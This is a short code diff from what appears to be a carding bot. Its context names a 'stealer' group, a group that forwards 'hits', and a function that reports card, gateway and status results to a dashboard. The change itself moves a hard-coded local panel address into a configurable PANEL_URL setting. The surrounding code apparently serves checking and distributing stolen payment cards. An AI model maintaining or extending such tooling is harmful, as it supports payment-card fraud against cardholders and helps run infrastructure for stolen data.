@@ -68,6 +68,10 @@ LOGS_GROUP_ID = _load_logs_group_id()
 HIT_FORWARD_GROUP = int(_config.get("HIT_FORWARD_GROUP", -1003561084296) or 0)
 STEALER_GROUP_2 = -1003862598213
 
+# The panel listens on its own port, so the address is a setting and
+# not a number written into the code.
+PANEL_URL = os.environ.get("PANEL_URL", "http://localhost:8080").rstrip("/")
+
 PREMIUM_FILE = "premium.json"
 FREE_FILE = "free_users.json"
 SITE_FILE = "user_sites.json"
@@ -982,7 +986,7 @@ async def notify_dashboard_hit(card, status, response, gateway, user_id=None, us
         session_secret = os.environ.get("SESSION_SECRET", "")
         headers = {"Content-Type": "application/json", "x-bot-secret": session_secret}
         async with aiohttp.ClientSession() as sess:
-            async with sess.post("http://localhost:5000/api/activity/bot-hit", json=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+            async with sess.post(f"{PANEL_URL}/api/activity/bot-hit", json=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                 pass
     except Exception as e:
         print(f"Dashboard notify error: {e}")
